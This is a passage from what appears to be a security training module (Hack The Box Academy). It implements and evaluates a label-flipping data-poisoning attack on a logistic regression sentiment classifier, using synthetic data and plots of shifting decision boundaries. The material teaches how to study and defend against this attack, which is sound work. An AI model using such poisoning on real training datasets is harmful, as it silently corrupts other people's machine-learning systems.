    plt.legend(handles=handles, title=<span class="hljs-string">"Classes"</span>)
    plt.grid(True, color=hacker_grey, linestyle=<span class="hljs-string">"--"</span>, linewidth=0.5, <span class="hljs-keyword">alpha</span>=0.3)
    plt.xlim(xx.<span class="hljs-built_in">min</span>(), xx.<span class="hljs-built_in">max</span>())
    plt.ylim(yy.<span class="hljs-built_in">min</span>(), yy.<span class="hljs-built_in">max</span>())
    plt.show()


# <span class="hljs-keyword">Plot</span> the decision boundary <span class="hljs-keyword">for</span> the baseline model
plot_decision_boundary(
    baseline_model,
    X_train,
    y_train,
    title=f<span class="hljs-string">"Baseline Model Decision Boundary\nAccuracy: {baseline_accuracy:.4f}"</span>,
)
</code></pre>
<p>The resulting plot shows the linear decision boundary learned by the baseline model, effectively separating the simulated <code>Negative</code> and <code>Positive</code> sentiment clusters in the training data. The high accuracy score indicates it generalizes well to the unseen test data.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/label_flipping_baseline.png" alt="label\_flipping\_baseline.png"></p>
<hr>
<h2 id="the-label-flipping-attack">The Label Flipping Attack</h2>
<hr>
<p>With an established baseline, we can now execute the actual attack, and to do this, we will create a function that will take the original training labels (<code>y_train</code>, representing the true sentiments) and a <code>poisoning percentage</code> as input. It will randomly select the specified fraction of training data points (reviews) and flip their labels - changing <code>Negative</code> (0) to <code>Positive</code> (1) and <code>Positive</code> (1) to <code>Negative</code> (0).</p>
<p>The implication of this is significant. As we have established, the model learns its parameters (𝐰,b) by minimizing the average <code>log-loss</code>, L, across the training dataset, the whole point of training is to find the 𝐰 and b that make this loss L as small as possible, meaning the predicted probabilities pi align well with the true labels yi.</p>
<p>When we flip a label for a specific instance from its true value yi to an incorrect value yi′, we directly corrupt the contribution of that instance to the overall loss calculation. For example, consider an instance 𝐱i that truly belongs to class 0 (so yi=0) but its label is flipped to yi′=1. The term for this instance inside the sum changes from −[0⋅log⁡(pi)+(1−0)log⁡(1−pi)]=−log⁡(1−pi) to −[1⋅log⁡(pi)+(1−1)log⁡(1−pi)]=−log⁡(pi).</p>
<p>If the model, based on the features 𝐱i, correctly learns to predict a low probability pi for class 1 (since the instance truly belongs to class 0), the original term −log⁡(1−pi) would be small, but the corrupted term −log⁡(pi) becomes very large as pi→0.</p>
<p>This large error signal for the flipped instance strongly influences the optimization process. It forces the algorithm to adjust the parameters 𝐰 and b not only fit the correctly labeled data, but also to try and accommodate these poisoned points, and in doing so, it pushes the learned <code>decision boundary</code> defined by 𝐰T𝐱+b=0, <code>away from the optimal position</code> determined by the true underlying data distribution.</p>
<h3 id="flip-_labels">flip_labels</h3>
<p>To execute this attack, we will implement a function to contain all logic: <code>flip_labels</code>. This function takes the original training labels (<code>y_train</code>) and a <code>poison_percentage</code> as input, specifying the fraction of labels to flip.</p>
<p>First, we define the function signature and ensure the provided <code>poison_percentage</code> is a valid value between 0 and 1. This prevents nonsensical inputs. We also calculate the absolute number of labels to flip (<code>n_to_flip</code>) based on the total number of samples and the specified percentage.</p>
<p>Code: python</p>
<pre><code class="lang-python">def flip_labels(y, poison_percentage):
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-number">0</span> &lt;= poison_percentage &lt;= <span class="hljs-number">1</span>:
        raise ValueError(<span class="hljs-string">"poison_percentage must be between 0 and 1."</span>)

    n_samples = len(y)
    n_to_flip = int(n_samples * poison_percentage)

    <span class="hljs-keyword">if</span> n_to_flip == <span class="hljs-number">0</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"Warning: Poison percentage is 0 or too low to flip any labels."</span>)
        # Return unchanged <span class="hljs-built_in">labels</span> <span class="hljs-keyword">and</span> empty <span class="hljs-built_in">indices</span> <span class="hljs-keyword">if</span> no flips are needed
        <span class="hljs-built_in">return</span> y.<span class="hljs-built_in">copy</span>(), <span class="hljs-built_in">np</span>.<span class="hljs-built_in">array</span>([], dtype=int)
</code></pre>
<p>Next, we select which specific reviews (data points) will have their sentiment labels flipped. We use a NumPy random number generator (<code>rng_instance</code>) seeded with our global <code>SEED</code> (or the function&#39;s seed parameter) for reproducible random selection. The <code>choice</code> method selects <code>n_to_flip</code> unique indices from the range <code>0</code> to <code>n_samples - 1</code> without replacement. These <code>flipped_indices</code> identify the exact reviews targeted by the attack.</p>
<p>Code: python</p>
<pre><code class="lang-python">    <span class="hljs-comment"># Use the defined SEED for the random number generator</span>
    <span class="hljs-attr">rng_instance</span> = np.random.default_rng(SEED)
    <span class="hljs-comment"># Select unique indices to flip</span>
    <span class="hljs-attr">flipped_indices</span> = rng_instance.choice(n_samples, <span class="hljs-attr">size=n_to_flip,</span> <span class="hljs-attr">replace=False)</span>
</code></pre>
<p>Now, we perform the actual label flipping. We create a copy of the original label array (<code>y_poisoned = y.copy()</code>) to avoid altering the original data. For the elements at the <code>flipped_indices</code>, we invert their labels: <code>0</code> becomes <code>1</code>, and <code>1</code> becomes <code>0</code>. A concise way to do this is <code>1 - label</code> for binary 0/1 labels, or using <code>np.where</code> for clarity.</p>
<p>Code: python</p>
<pre><code class="lang-python">    <span class="hljs-comment"># Create a copy to avoid modifying the original array</span>
    <span class="hljs-attr">y_poisoned</span> = y.copy()

    <span class="hljs-comment"># Get the original labels at the indices we are about to flip</span>
    <span class="hljs-attr">original_labels_at_flipped</span> = y_poisoned[flipped_indices]

    <span class="hljs-comment"># Apply the flip: if original was 0, set to 1; otherwise (if 1), set to 0</span>
    y_poisoned[flipped_indices] = np.where(<span class="hljs-attr">original_labels_at_flipped</span> == <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)

    print(f<span class="hljs-string">"Flipping {n_to_flip} labels ({poison_percentage * 100:.1f}%)."</span>)
</code></pre>
<p>Lastly, the function returns the <code>y_poisoned</code> array containing the corrupted labels and the <code>flipped_indices</code> array, allowing us to track which reviews were affected.</p>
<p>Code: python</p>
<pre><code class="lang-python">    <span class="hljs-keyword">return</span> y_poisoned, flipped_indices
</code></pre>
<p>We also need a function to plot the data so its easy to see the effects of the attack.</p>
<p>Code: python</p>
<pre><code class="lang-python">def plot_poisoned_data(
    X,
    y_original,
    y_poisoned,
    flipped_indices,
    title=<span class="hljs-string">"Poisoned Data Visualization"</span>,
    target_class_info=None,
):
    <span class="hljs-string">""</span>"
    Plots a 2D dataset, highlighting points whose labels were flipped.

    Parameters:
    - X (np.ndarray): Feature data (n_samples, 2).
    - y_original (np.ndarray): The original labels before flipping (used <span class="hljs-keyword">for</span> context <span class="hljs-keyword">if</span> needed, currently unused <span class="hljs-keyword">in</span> logic but good practice).
    - y_poisoned (np.ndarray): Labels after flipping.
    - flipped_indices (np.ndarray): Indices of the samples that were flipped.
    - title (str): The title <span class="hljs-keyword">for</span> the <span class="hljs-keyword">plot</span>.
    - target_class_info (int, optional): The <span class="hljs-keyword">class</span> <span class="hljs-keyword">label</span> of the points that were targeted <span class="hljs-keyword">for</span> flipping. Defaults to None.
    <span class="hljs-string">""</span>"
    plt.figure(figsize=(12, 7))

    # Identify non-flipped points
    mask_not_flipped = np.ones(len(y_poisoned), dtype=bool)
    mask_not_flipped[flipped_indices] = False

    # <span class="hljs-keyword">Plot</span> non-flipped points (color <span class="hljs-keyword">by</span> their poisoned <span class="hljs-keyword">label</span>, <span class="hljs-keyword">which</span> is same <span class="hljs-keyword">as</span> original)
    plt.<span class="hljs-keyword">scatter</span>(
        X[mask_not_flipped, 0],
        X[mask_not_flipped, 1],
        c=y_poisoned[mask_not_flipped],
        cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
        edgecolors=node_black,
        s=50,
        <span class="hljs-keyword">alpha</span>=0.6,
        <span class="hljs-keyword">label</span>=<span class="hljs-string">"Unchanged Label"</span>,  # <span class="hljs-keyword">Keep</span> this generic
    )

    # Determine the <span class="hljs-keyword">label</span> <span class="hljs-keyword">for</span> flipped points <span class="hljs-keyword">in</span> the legend
    <span class="hljs-keyword">if</span> target_class_info is not None:
        flipped_legend_label = f<span class="hljs-string">"Flipped (Orig Class {target_class_info})"</span>
        # You could potentially <span class="hljs-keyword">use</span> target_class_info to <span class="hljs-keyword">adjust</span> facecolor <span class="hljs-keyword">if</span> needed,
        # but current logic colors <span class="hljs-keyword">by</span> the new <span class="hljs-keyword">label</span> <span class="hljs-keyword">which</span> is often clearer.
    <span class="hljs-keyword">else</span>:
        flipped_legend_label = <span class="hljs-string">"Flipped Label"</span>

    # <span class="hljs-keyword">Plot</span> flipped points with a <span class="hljs-keyword">distinct</span> marker and outline
    <span class="hljs-keyword">if</span> len(flipped_indices) &gt; 0:
        # Color flipped points according to their new (poisoned) <span class="hljs-keyword">label</span>
        plt.<span class="hljs-keyword">scatter</span>(
            X[flipped_indices, 0],
            X[flipped_indices, 1],
            c=y_poisoned[flipped_indices],  # Color <span class="hljs-keyword">by</span> the new <span class="hljs-keyword">label</span>
            cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
            edgecolors=malware_red,  # Highlight edge <span class="hljs-keyword">in</span> red
            linewidths=1.5,
            marker=<span class="hljs-string">"X"</span>,  # <span class="hljs-keyword">Use</span> 'X' marker
            s=100,
            <span class="hljs-keyword">alpha</span>=0.9,
            <span class="hljs-keyword">label</span>=flipped_legend_label,  # <span class="hljs-keyword">Use</span> the determined <span class="hljs-keyword">label</span>
        )

    plt.title(title, fontsize=16, color=htb_green)
    plt.xlabel(<span class="hljs-string">"Feature 1"</span>, fontsize=12)
    plt.ylabel(<span class="hljs-string">"Feature 2"</span>, fontsize=12)

    # Create legend
    handles = [
        plt.Line2D(
            [0],
            [0],
            marker=<span class="hljs-string">"o"</span>,
            color=<span class="hljs-string">"w"</span>,
            <span class="hljs-keyword">label</span>=<span class="hljs-string">"Class 0 Point (Azure)"</span>,
            markersize=10,
            markerfacecolor=azure,
            linestyle=<span class="hljs-string">"None"</span>,
        ),
        plt.Line2D(
            [0],
            [0],
            marker=<span class="hljs-string">"o"</span>,
            color=<span class="hljs-string">"w"</span>,
            <span class="hljs-keyword">label</span>=<span class="hljs-string">"Class 1 Point (Yellow)"</span>,
            markersize=10,
            markerfacecolor=nugget_yellow,
            linestyle=<span class="hljs-string">"None"</span>,
        ),
        # Add the flipped legend entry using the <span class="hljs-keyword">label</span>
        plt.Line2D(
            [0],
            [0],
            marker=<span class="hljs-string">"X"</span>,
            color=<span class="hljs-string">"w"</span>,
            <span class="hljs-keyword">label</span>=flipped_legend_label,
            markersize=12,
            markeredgecolor=malware_red,
            markerfacecolor=hacker_grey,
            linestyle=<span class="hljs-string">"None"</span>,
        ),
    ]
    plt.legend(handles=handles, title=<span class="hljs-string">"Data Points"</span>)
    plt.grid(True, color=hacker_grey, linestyle=<span class="hljs-string">"--"</span>, linewidth=0.5, <span class="hljs-keyword">alpha</span>=0.3)
    plt.show()
</code></pre>
<hr>
<h2 id="evaluating-the-label-flipping-attack">Evaluating the Label Flipping Attack</h2>
<hr>
<p>Let&#39;s begin by poisoning a small fraction, say 10%, of the training labels and observe the impact on our sentiment analysis model.</p>
<p>The process involves several steps:</p>
<ol>
<li>Use the <code>flip_labels</code> function on the original <code>y_train</code> data to create a poisoned version (<code>y_train_poisoned_10</code>) where 10% of the sentiment labels are flipped.</li>
<li>Visualize the resulting corrupted training set using <code>plot_poisoned_data</code> to see which points were flipped.</li>
<li>Train a new <code>Logistic Regression</code> model (<code>model_10_percent</code>) using the original features <code>X_train</code> but the poisoned labels <code>y_train_poisoned_10</code>.</li>
<li>Evaluate this poisoned model&#39;s accuracy on the original, clean test set (<code>X_test</code>, <code>y_test</code>). This is crucial - we want to see how the poisoning affects performance on legitimate, unseen data.</li>
<li>Visualize the decision boundary learned by the <code>model_10_percent</code> using <code>plot_decision_boundary</code>.</li>
</ol>
<p>Code: python</p>
<pre><code class="lang-python">results = {
    <span class="hljs-string">"percentage"</span>: [],
    <span class="hljs-string">"accuracy"</span>: [],
    <span class="hljs-string">"model"</span>: [],
    <span class="hljs-string">"y_train_poisoned"</span>: [],
    <span class="hljs-string">"flipped_indices"</span>: [],
}
decision_boundaries_data = []  # To store data <span class="hljs-keyword">for</span> the combined plot

# Add baseline results <span class="hljs-built_in">first</span>
results[<span class="hljs-string">"percentage"</span>].<span class="hljs-built_in">append</span>(<span class="hljs-number">0.0</span>)
results[<span class="hljs-string">"accuracy"</span>].<span class="hljs-built_in">append</span>(baseline_accuracy)
results[<span class="hljs-string">"model"</span>].<span class="hljs-built_in">append</span>(baseline_model)
results[<span class="hljs-string">"y_train_poisoned"</span>].<span class="hljs-built_in">append</span>(y_train.<span class="hljs-built_in">copy</span>())
results[<span class="hljs-string">"flipped_indices"</span>].<span class="hljs-built_in">append</span>(<span class="hljs-built_in">np</span>.<span class="hljs-built_in">array</span>([], dtype=int))

# Calculate meshgrid once <span class="hljs-keyword">for</span> all boundary plots
h = <span class="hljs-number">0.02</span>  # Step size <span class="hljs-keyword">in</span> the <span class="hljs-built_in">mesh</span>
x_min, x_max = X_train[:, <span class="hljs-number">0</span>].<span class="hljs-built_in">min</span>() - <span class="hljs-number">1</span>, X_train[:, <span class="hljs-number">0</span>].<span class="hljs-built_in">max</span>() + <span class="hljs-number">1</span>
y_min, y_max = X_train[:, <span class="hljs-number">1</span>].<span class="hljs-built_in">min</span>() - <span class="hljs-number">1</span>, X_train[:, <span class="hljs-number">1</span>].<span class="hljs-built_in">max</span>() + <span class="hljs-number">1</span>
xx, yy = <span class="hljs-built_in">np</span>.meshgrid(<span class="hljs-built_in">np</span>.arange(x_min, x_max, h), <span class="hljs-built_in">np</span>.arange(y_min, y_max, h))
mesh_points = <span class="hljs-built_in">np</span>.c_[xx.ravel(), yy.ravel()]

# Perform <span class="hljs-number">10</span><span class="hljs-symbol">%</span> Poisoning
poison_percentage_10 = <span class="hljs-number">0.10</span>
<span class="hljs-built_in">print</span>(f<span class="hljs-string">"\n--- Testing with {poison_percentage_10 * 100:.0f}% Poisoned Data ---"</span>)

# Create <span class="hljs-number">10</span><span class="hljs-symbol">%</span> Poisoned Data
y_train_poisoned_10, flipped_indices_10 = flip_labels(y_train, poison_percentage_10)

# Visualize <span class="hljs-number">10</span><span class="hljs-symbol">%</span> Poisoned Data
plot_poisoned_data(
    X_train,
    y_train,
    y_train_poisoned_10,
    flipped_indices_10,
    <span class="hljs-built_in">title</span>=f<span class="hljs-string">"Training Data with {poison_percentage_10 * 100:.0f}% Flipped Labels"</span>,
)

# Train Model on <span class="hljs-number">10</span><span class="hljs-symbol">%</span> Poisoned Data
model_10_percent = LogisticRegression(random_state=SEED)
model_10_percent.fit(X_train, y_train_poisoned_10)  # Train with original X, poisoned y

# Evaluate on Clean Test Data
y_pred_10_percent = model_10_percent.predict(X_test)
accuracy_10_percent = accuracy_score(y_test, y_pred_10_percent)
<span class="hljs-built_in">print</span>(f<span class="hljs-string">"Accuracy on clean test set (10% poisoned): {accuracy_10_percent:.4f}"</span>)

# Store Results
results[<span class="hljs-string">"percentage"</span>].<span class="hljs-built_in">append</span>(poison_percentage_10)
results[<span class="hljs-string">"accuracy"</span>].<span class="hljs-built_in">append</span>(accuracy_10_percent)
results[<span class="hljs-string">"model"</span>].<span class="hljs-built_in">append</span>(model_10_percent)
results[<span class="hljs-string">"y_train_poisoned"</span>].<span class="hljs-built_in">append</span>(y_train_poisoned_10)
results[<span class="hljs-string">"flipped_indices"</span>].<span class="hljs-built_in">append</span>(flipped_indices_10)

# Visualize Decision Boundary
plot_decision_boundary(
    model_10_percent,
    X_train,
    y_train_poisoned_10,  # Visualize boundary with poisoned <span class="hljs-built_in">labels</span> shown
    <span class="hljs-built_in">title</span>=f<span class="hljs-string">"Decision Boundary ({poison_percentage_10 * 100:.0f}% Poisoned)\nAccuracy: {accuracy_10_percent:.4f}"</span>,
)

# Store decision boundary prediction <span class="hljs-keyword">for</span> combined plot
Z_10 = model_10_percent.predict(mesh_points)
Z_10 = Z_10.reshape(xx.shape)
decision_boundaries_data.<span class="hljs-built_in">append</span>({<span class="hljs-string">"percentage"</span>: poison_percentage_10, <span class="hljs-string">"Z"</span>: Z_10})
<span class="hljs-built_in">print</span>(
    f<span class="hljs-string">"Baseline accuracy was: {baseline_accuracy:.4f}"</span>
)  # Print baseline <span class="hljs-keyword">for</span> comparison
</code></pre>
<p>In this specific case, with our clearly separated synthetic data, poisoning only 10% of the labels results in no accuracy loss, both are 99.33% accurate. While the accuracy has not changed, the decision boundary will still have shifted slightly as the model compensates for the poisoned data.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/label_flipping_10p_poisoned_boundary.png" alt="label\_flipping\_10p\_poisoned\_boundary.png"></p>
<p>To get a clearer view of the shift, let&#39;s overlay the original <code>baseline boundary</code> (trained on clean data) and the <code>10% poisoned boundary</code> on the same plot.</p>
<p>Code: python</p>
<pre><code class="lang-python">plt.figure(figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">8</span>))

# Plot the <span class="hljs-number">10</span><span class="hljs-symbol">%</span> poisoned data <span class="hljs-built_in">points</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">context</span>
mask_not_flipped_10 = <span class="hljs-built_in">np</span>.ones(len(y_train), dtype=bool)
mask_not_flipped_10[flipped_indices_10] = False
plt.scatter(
    X_train[mask_not_flipped_10, <span class="hljs-number">0</span>],
    X_train[mask_not_flipped_10, <span class="hljs-number">1</span>],
    c=y_train_poisoned_10[mask_not_flipped_10],
    cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
    edgecolors=node_black,
    s=<span class="hljs-number">50</span>,
    alpha=<span class="hljs-number">0.6</span>,
    <span class="hljs-built_in">label</span>=<span class="hljs-string">"Original Label (in 10% set)"</span>,
)

# Plot flipped <span class="hljs-built_in">points</span> ('X' marker)
<span class="hljs-keyword">if</span> len(flipped_indices_10) &gt; <span class="hljs-number">0</span>:
    plt.scatter(
        X_train[flipped_indices_10, <span class="hljs-number">0</span>],
        X_train[flipped_indices_10, <span class="hljs-number">1</span>],
        c=y_train_poisoned_10[flipped_indices_10],  # Color by the <span class="hljs-built_in">new</span> poisoned <span class="hljs-built_in">label</span>
        cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
        edgecolors=malware_red,
        linewidths=<span class="hljs-number">1.5</span>,
        marker=<span class="hljs-string">"X"</span>,
        s=<span class="hljs-number">100</span>,
        alpha=<span class="hljs-number">0.9</span>,
        <span class="hljs-built_in">label</span>=<span class="hljs-string">"Flipped Label (10% set)"</span>,
    )

# Overlay Baseline Decision Boundary (Solid Green)
baseline_model_retrieved = results[<span class="hljs-string">"model"</span>][
    results[<span class="hljs-string">"percentage"</span>].index(<span class="hljs-number">0.0</span>)
]  # Get baseline model
<span class="hljs-keyword">if</span> baseline_model_retrieved:
    Z_baseline = baseline_model_retrieved.predict(mesh_points).reshape(xx.shape)
    plt.<span class="hljs-built_in">contour</span>(
        xx,
        yy,
        Z_baseline,
        levels=[<span class="hljs-number">0.5</span>],
        colors=[htb_green],
        linestyles=[<span class="hljs-string">"solid"</span>],
        linewidths=[<span class="hljs-number">2.5</span>],
    )
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"Warning: Baseline model not found for comparison plot."</span>)


# Overlay <span class="hljs-number">10</span><span class="hljs-symbol">%</span> Poisoned Decision Boundary
plt.<span class="hljs-built_in">contour</span>(
    xx,
    yy,
    Z_10,
    levels=[<span class="hljs-number">0.5</span>],
    colors=[aquamarine],
    linestyles=[<span class="hljs-string">"dashed"</span>],
    linewidths=[<span class="hljs-number">2.5</span>],
)


plt.<span class="hljs-built_in">title</span>(
    <span class="hljs-string">"Comparison: Baseline vs. 10% Poisoned Decision Boundary"</span>,
    fontsize=<span class="hljs-number">16</span>,
    <span class="hljs-built_in">color</span>=htb_green,
)
plt.<span class="hljs-built_in">xlabel</span>(<span class="hljs-string">"Feature 1"</span>, fontsize=<span class="hljs-number">12</span>)
plt.<span class="hljs-built_in">ylabel</span>(<span class="hljs-string">"Feature 2"</span>, fontsize=<span class="hljs-number">12</span>)

# Create <span class="hljs-built_in">legend</span>
handles = [
    plt.Line2D(
        [<span class="hljs-number">0</span>],
        [<span class="hljs-number">0</span>],
        <span class="hljs-built_in">color</span>=htb_green,
        lw=<span class="hljs-number">2.5</span>,
        linestyle=<span class="hljs-string">"solid"</span>,
        <span class="hljs-built_in">label</span>=<span class="hljs-string">"Baseline Boundary (0%)"</span>,
    ),
    plt.Line2D(
        [<span class="hljs-number">0</span>],
        [<span class="hljs-number">0</span>],
        <span class="hljs-built_in">color</span>=aquamarine,
        lw=<span class="hljs-number">2.5</span>,
        linestyle=<span class="hljs-string">"dashed"</span>,
        <span class="hljs-built_in">label</span>=<span class="hljs-string">"Poisoned Boundary (10%)"</span>,
    ),
    plt.Line2D(
        [<span class="hljs-number">0</span>],
        [<span class="hljs-number">0</span>],
        marker=<span class="hljs-string">"o"</span>,
        <span class="hljs-built_in">color</span>=<span class="hljs-string">"w"</span>,
        <span class="hljs-built_in">label</span>=<span class="hljs-string">"Class 0 Point"</span>,
        markersize=<span class="hljs-number">10</span>,
        markerfacecolor=azure,
        linestyle=<span class="hljs-string">"None"</span>,
    ),
    plt.Line2D(
        [<span class="hljs-number">0</span>],
        [<span class="hljs-number">0</span>],
        marker=<span class="hljs-string">"o"</span>,
        <span class="hljs-built_in">color</span>=<span class="hljs-string">"w"</span>,
        <span class="hljs-built_in">label</span>=<span class="hljs-string">"Class 1 Point"</span>,
        markersize=<span class="hljs-number">10</span>,
        markerfacecolor=nugget_yellow,
        linestyle=<span class="hljs-string">"None"</span>,
    ),
    plt.Line2D(
        [<span class="hljs-number">0</span>],
        [<span class="hljs-number">0</span>],
        marker=<span class="hljs-string">"X"</span>,
        <span class="hljs-built_in">color</span>=<span class="hljs-string">"w"</span>,
        <span class="hljs-built_in">label</span>=<span class="hljs-string">"Flipped Point"</span>,
        markersize=<span class="hljs-number">10</span>,
        markeredgecolor=malware_red,
        markerfacecolor=hacker_grey,
        linestyle=<span class="hljs-string">"None"</span>,
    ),
]
plt.<span class="hljs-built_in">legend</span>(handles=handles, <span class="hljs-built_in">title</span>=<span class="hljs-string">"Boundaries &amp; Data Points"</span>)
plt.<span class="hljs-built_in">grid</span>(True, <span class="hljs-built_in">color</span>=hacker_grey, linestyle=<span class="hljs-string">"--"</span>, <span class="hljs-built_in">linewidth</span>=<span class="hljs-number">0.5</span>, alpha=<span class="hljs-number">0.3</span>)
plt.xlim(xx.<span class="hljs-built_in">min</span>(), xx.<span class="hljs-built_in">max</span>())
plt.ylim(yy.<span class="hljs-built_in">min</span>(), yy.<span class="hljs-built_in">max</span>())
plt.<span class="hljs-built_in">show</span>()
</code></pre>
<p>We can clearly see how the decision boundary has started to shift in this plot:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/label_flipping_10p_overlaid_boundary.png" alt="label\_flipping\_10p\_overlaid\_boundary.png"></p>
<p>Now, let&#39;s systematically increase the <code>poisoning percentage</code> from 20% up to 50% and observe the effects. We will repeat the process for each level: flip labels, train a new model, evaluate its accuracy on the clean test set, and visualize the resulting decision boundary.</p>
<p>Code: python</p>
<pre><code class="lang-python">poison_percentages_high = [<span class="hljs-number">0.20</span>, <span class="hljs-number">0.30</span>, <span class="hljs-number">0.40</span>, <span class="hljs-number">0.50</span>]

<span class="hljs-keyword">for</span> <span class="hljs-keyword">pp</span> in poison_percentages_high:
    <span class="hljs-keyword">print</span>(<span class="hljs-keyword">f</span><span class="hljs-string">"\n--- Training with {pp * 100:.0f}% Poisoned Data ---"</span>)

    # Create Poisoned Data
    y_train_poisoned, flipped_idx = flip_labels(y_train, <span class="hljs-keyword">pp</span>)

    # Train Model <span class="hljs-keyword">on</span> Poisoned Data
    poisoned_model = LogisticRegression(random_state=SEED)
    <span class="hljs-keyword">try</span>:
        poisoned_model.fit(
            X_train, y_train_poisoned
        )  # Train with original <span class="hljs-keyword">X</span>, but poisoned <span class="hljs-keyword">y</span>
    except Exception <span class="hljs-keyword">as</span> <span class="hljs-keyword">e</span>:
        <span class="hljs-keyword">print</span>(<span class="hljs-keyword">f</span><span class="hljs-string">"Error training model at {pp * 100}% poisoning: {e}"</span>)
        results[<span class="hljs-string">"percentage"</span>].<span class="hljs-keyword">append</span>(<span class="hljs-keyword">pp</span>)
        results[<span class="hljs-string">"accuracy"</span>].<span class="hljs-keyword">append</span>(np.nan)  # Indicate failure
        results[<span class="hljs-string">"model"</span>].<span class="hljs-keyword">append</span>(None)
        results[<span class="hljs-string">"y_train_poisoned"</span>].<span class="hljs-keyword">append</span>(
            y_train_poisoned
        )  # Still store poisoned labels
        results[<span class="hljs-string">"flipped_indices"</span>].<span class="hljs-keyword">append</span>(flipped_idx)  # <span class="hljs-built_in">and</span> indices
        <span class="hljs-keyword">continue</span>  # Skip <span class="hljs-keyword">to</span> <span class="hljs-keyword">next</span> percentage

    # Evaluate <span class="hljs-keyword">on</span> Clean Test Data
    y_pred_poisoned = poisoned_model.predict(X_test)
    accuracy = accuracy_score(
        y_test, y_pred_poisoned
    )  # Always evaluate against TRUE test labels
    <span class="hljs-keyword">print</span>(<span class="hljs-keyword">f</span><span class="hljs-string">"Accuracy on clean test set: {accuracy:.4f}"</span>)

    # Store Results
    results[<span class="hljs-string">"percentage"</span>].<span class="hljs-keyword">append</span>(<span class="hljs-keyword">pp</span>)
    results[<span class="hljs-string">"accuracy"</span>].<span class="hljs-keyword">append</span>(accuracy)
    results[<span class="hljs-string">"model"</span>].<span class="hljs-keyword">append</span>(poisoned_model)
    results[<span class="hljs-string">"y_train_poisoned"</span>].<span class="hljs-keyword">append</span>(y_train_poisoned)
    results[<span class="hljs-string">"flipped_indices"</span>].<span class="hljs-keyword">append</span>(flipped_idx)

    # Visualize Poisoned Data <span class="hljs-built_in">and</span> Decision Boundary
    plot_poisoned_data(
        X_train,
        y_train,
        y_train_poisoned,
        flipped_idx,
        title=<span class="hljs-keyword">f</span><span class="hljs-string">"Training Data with {pp * 100:.0f}% Flipped Labels"</span>,
    )

    plot_decision_boundary(
        poisoned_model,
        X_train,
        y_train_poisoned,  # Visualize boundary with poisoned labels shown
        title=<span class="hljs-keyword">f</span><span class="hljs-string">"Decision Boundary ({pp * 100:.0f}% Poisoned)\nAccuracy: {accuracy:.4f}"</span>,
    )

    # Store decision boundary prediction <span class="hljs-keyword">for</span> combined plot
    Z = poisoned_model.predict(mesh_points)
    Z = Z.reshape(xx.shape)
    decision_boundaries_data.<span class="hljs-keyword">append</span>({<span class="hljs-string">"percentage"</span>: <span class="hljs-keyword">pp</span>, <span class="hljs-string">"Z"</span>: Z})

<span class="hljs-keyword">print</span>(<span class="hljs-string">"\n--- Evaluation Complete for Higher Percentages ---"</span>)
</code></pre>
<p>Looking at the outputs we can see how the boundaries are shifting for each percentage shift.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/label_flipping_20p_boundary.png" alt="label\_flipping\_20p\_boundary.png"></p>
<p>Let&#39;s consolidate the findings. We&#39;ll first plot the trend of the model&#39;s accuracy (evaluated on the clean test set) against the percentage of labels flipped during training (from 0% up to 50%).</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Plot accuracy vs. poisoning percentage</span>
plt.figure(<span class="hljs-attr">figsize=(8,</span> <span class="hljs-number">5</span>))
<span class="hljs-comment"># Ensure percentages and accuracies are sorted correctly if the order changed for any reason</span>
<span class="hljs-attr">plot_data</span> = sorted(zip(results[<span class="hljs-string">"percentage"</span>], results[<span class="hljs-string">"accuracy"</span>]))
<span class="hljs-attr">plot_percentages</span> = [p * <span class="hljs-number">100</span> for p, a <span class="hljs-keyword">in</span> plot_data]
<span class="hljs-attr">plot_accuracies</span> = [a for p, a <span class="hljs-keyword">in</span> plot_data]

plt.plot(
    plot_percentages,
    plot_accuracies,
    <span class="hljs-attr">marker="o",</span>
    <span class="hljs-attr">linestyle="-",</span>
    <span class="hljs-attr">color=htb_green,</span>
    <span class="hljs-attr">markersize=8,</span>
)
plt.title(<span class="hljs-string">"Model Accuracy vs. Label Flipping Percentage"</span>, <span class="hljs-attr">fontsize=16,</span> <span class="hljs-attr">color=htb_green)</span>
plt.xlabel(<span class="hljs-string">"Percentage of Training Labels Flipped (%)"</span>, <span class="hljs-attr">fontsize=12)</span>
plt.ylabel(<span class="hljs-string">"Accuracy on Clean Test Set"</span>, <span class="hljs-attr">fontsize=12)</span>
plt.xticks(plot_percentages)  <span class="hljs-comment"># Ensure ticks match the evaluated percentages</span>
plt.ylim(<span class="hljs-number">0</span>, <span class="hljs-number">1.05</span>)
plt.grid(True, <span class="hljs-attr">color=hacker_grey,</span> <span class="hljs-attr">linestyle="--",</span> <span class="hljs-attr">linewidth=0.5,</span> <span class="hljs-attr">alpha=0.3)</span>
plt.show()
</code></pre>
<p>Because our data is so clearly separated, the shifting boundaries don&#39;t actually cause any significant accuracy loss. Remember, this is only the case for our limited data, in a real world attack, where data is far from being clean or clear, it&#39;s quite probable that even a slight shift in the boundary will cause an accuracy loss.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/label_flipping_consolidated_accuracy.png" alt="label\_flipping\_consolidated\_accuracy.png"></p>
<p>Despite this no significant loss in accuracy until 50% of the data is poisoned, the <code>decison boundary</code> will still be constantly shifting. We can plot all of the boundaries overlaid into a single image to clearly visualize this phenomenon.</p>
<p>Code: python</p>
<pre><code class="lang-python">plt.figure(figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">8</span>))

# Plot the original clean data <span class="hljs-built_in">points</span> <span class="hljs-keyword">for</span> reference
plt.scatter(
    X_train[:, <span class="hljs-number">0</span>],
    X_train[:, <span class="hljs-number">1</span>],
    c=y_train,
    cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
    edgecolors=node_black,
